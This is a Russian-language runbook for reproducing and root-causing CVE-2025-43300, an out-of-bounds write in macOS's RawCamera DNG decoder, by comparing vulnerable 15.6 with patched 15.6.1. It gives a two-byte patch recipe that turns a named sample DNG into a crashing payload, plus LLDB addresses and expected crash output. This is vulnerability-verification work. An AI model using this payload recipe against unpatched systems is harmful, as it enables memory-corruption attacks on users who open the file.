# DNGViewer Crash Oracle — Runbook (macOS 15.6 vs 15.6.1)

Цель: подтвердить CVE-2025-43300 (OOB write в RawCamera / CDNGLosslessJpegUnpacker)
на macOS 15.6 (vulnerable) и 15.6.1 (patched control).

Адреса функций — из бинарного diff Quarkslab (macOS 15.6 vs 15.6.1), Apple Silicon (arm64e).

## 0. Матрица прогонов

| # | OS | Файл | Ожидаемо |
|---|----|------|----------|
| 1 | 15.6 | original.dng | **нет crash** (SamplesPerPixel=1 → не доходит до уязвимого пути) |
| 2 | 15.6 | payload.dng | **CRASH** (EXC_BAD_ACCESS / SIGBUS) или отложенный crash после corruption |
| 3 | 15.6.1 | payload.dng | **нет crash**; exception внутри декодера, картинка может не отрендериться |
| 4 | 15.6.1 | original.dng | нет crash, картинка рендерится |

## 1. Подготовка (однократно)

1. Две системы (или VM со снапшотами): macOS 15.6 и macOS 15.6.1.
   - На 15.6: System Settings → General → Software Update → Automatic Updates → **выкл**
     (иначе улетит в 15.6.1).
2. Xcode Command Line Tools: `xcode-select --install` (clang + lldb).
3. Скачать DNG **строго из PoC** (офсеты специфичны для этого файла):
   - https://www.dpreview.com/sample-galleries/4949897610/pentax-k-3-mark-iii-sample-gallery/1638788346
   - сохранить как `original.dng` (размер > 0x3E40B ≈ 255 KB)
4. Payload:
   ```
   python3 make_dng_payload.py original.dng payload.dng
   python3 make_dng_payload.py payload.dng payload.dng --verify
   ```
   Ожидаемый вывод:
   ```
   [dng] 0x2fd00: 0x01 -> 0x02
   [dng] 0x3e40b: 0x02 -> 0x01
   [dng] 0x2fd00: 0x02 OK (patched)
   [dng] 0x3e40b: 0x01 OK (patched)
   ```
5. Скопировать на обе системы: `DNGViewer.m`, `original.dng`, `payload.dng`.

## 2. Сборка (на обеих системах)

```
clang -g -framework Foundation -framework AppKit -framework CoreImage -o DNGViewer DNGViewer.m
```
- `-g` — только для наших фреймов; системные фреймворки prebuilt.
- SIP **оставляем включённым** (debug-им свой бинарь, а не Preview — для Preview SIP off был нужен).
- Нужна GUI-сессия (окно/рендер); headless-SSH без окна не подойдёт.

## 3. Запуск без debug-гера (crash oracle)

```
./DNGViewer original.dng     # контроль
./DNGViewer payload.dng      # триггер
```
- Crash происходит в `[context createCGImage:...]` — **до появления окна**.
  Окно может не показаться — это нормально.
- Если на 15.6 crash не происходит (тихая corruption — OOB write попал в writable heap):
  ```
  MallocScribble=1 MallocPreScribble=1 MallocNanoZone=0 ./DNGViewer payload.dng
  ```
  прогнать 5–10 раз.
- Зафиксировать: сигнал/exit code, crash report:
  `~/Library/Logs/DiagnosticReports/DNGViewer-*.ips`
  (Exception Type, faulting address, backtrace — ожидаются фреймы из shared cache / RawCamera).
- На 15.6.1 в консоли может появиться `Failed to create CGImage.` (exception проглочен) —
  это ожидаемый маркер срабатывания bounds check.

## 4. LLDB (подтверждение root cause)

### 4.1 Запуск
```
lldb ./DNGViewer
```
Опционально — символы shared cache для читаемого дизассемблирования (Apple Silicon):
```
dscsymutil -o /tmp/dsc.dSYM /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
```
Совет Quarkslab: грузить **весь shared cache**, а не только бинарь.

### 4.2 Адреса (Apple Silicon arm64e)

| Функция | 15.6 (vulnerable) | 15.6.1 (patched) |
|---------|-------------------|------------------|
| Уязвимая функция (OOB write) | `0x1B2867120` | `0x1B28674F4` |
| Топ-уровень (3 проверки входа) | `0x1B2868E24` | сдвинулась (проверить) |
| Прямой caller | `0x1B2866F98` | не сдвинулась (ниже по адресу) |

Перед ставкой проверить:
```
(lldb) image lookup -a 0x1B2867120
```
Если не совпало (Intel Mac / другой билд): искать функцию по строке
`CDNGLosslessJpegUnpacker` в shared cache (strings + xref по vtable).

### 4.3 Breakpoints (15.6)
```
(lldb) breakpoint set -a 0x1B2868E24    # топ-уровень: условия входа
(lldb) breakpoint set -a 0x1B2867120    # уязвимая функция
(lldb) run payload.dng
```

### 4.4 На топ-уровне (0x1B2868E24) — ожидаемые значения
`this`-указатель объекта CDNGLosslessJpegUnpacker (arm64: x0, проверить по дизассембли):
```
(lldb) register read x0
(lldb) memory read -f x8 -c 1 $x0+0xd8    # field_d8
(lldb) memory read -f x8 -c 1 $x0+0xdc    # field_dc = SamplesPerPixel
```
**Ожидаемо для payload.dng:** `field_d8 = 0x0`, `field_dc = 0x2`.
Для original.dng: `field_dc = 0x1` → брейкпоинт на 0x1B2867120 **не сработает** (контроль).

### 4.5 На уязвимой функции (0x1B2867120)
```
(lldb) disassemble
(lldb) register read
```
- Найти цикл: указатель, инкрементируемый **шагом 2** (`add x?, x?, #2`) = `output`.
- Буфер: `width * height * SamplesPerPixel` (width/height из SOF3).
- По модели Quarkslab: на строку пишется **вдвое больше** ожидаемого
  (цикл `i < width*2` при NumComponents=1 + decompress() возвращает 2 байта).
- **Ожидаемо на 15.6:** `output` уходит за `buffer_end`, проверки нет →
  OOB write продолжается → crash (или тихая corruption).
- **Ожидаемо на 15.6.1** (брейкпоинт на `0x1B28674F4`): в дизассембли есть
  **дополнительный basic block** — сравнение `output` с `buffer_end` и
  переход на exception-обработчик. Вместо OOB write срабатывает exception.

### 4.6 На crash
```
(lldb) thread backtrace all
(lldb) register read
(lldb) memory read <faulting_address> -f x16
```
**Ожидаемо:** `stop reason = EXC_BAD_ACCESS (code 1, address 0x...)`;
backtrace через shared cache (RawCamera); faulting address = `output` за концом буфера.
Декод может идти в worker-потоке → `thread backtrace all`, не только текущий поток.

## 5. Критерии приёмки (oracle валиден)

- [ ] Прогон 2 (15.6 + payload): crash, backtrace через RawCamera
- [ ] Прогон 1 (15.6 + original): без crash
- [ ] Прогон 3 (15.6.1 + payload): без crash (exception в декодере)
- [ ] На топ-уровне: field_d8=0, field_dc=2
- [ ] Дизассембли 15.6.1 содержит добавленный bounds check (compare + branch на exception)
- [ ] Crash report сохранён (DiagnosticReports)

## 6. Подводные камни

- DNG **строго** из PoC — офсеты 0x2FD00/0x3E40B специфичны для файла.
- Не обновлять 15.6 → 15.6.1 (автообновления).
- Crash может быть **отложенным** (corruption используется позже) — несколько прогонов,
  MallocScribble.
- Адреса — Apple Silicon; на Intel (x86_64h) — искать по строке/vtable.
- Окно может не появиться (crash до окна) — нормально.
- Если на 15.6 картинка "отрисовалась" без crash — тихая corruption;
  oracle = crash report + LLDB, а не окно.
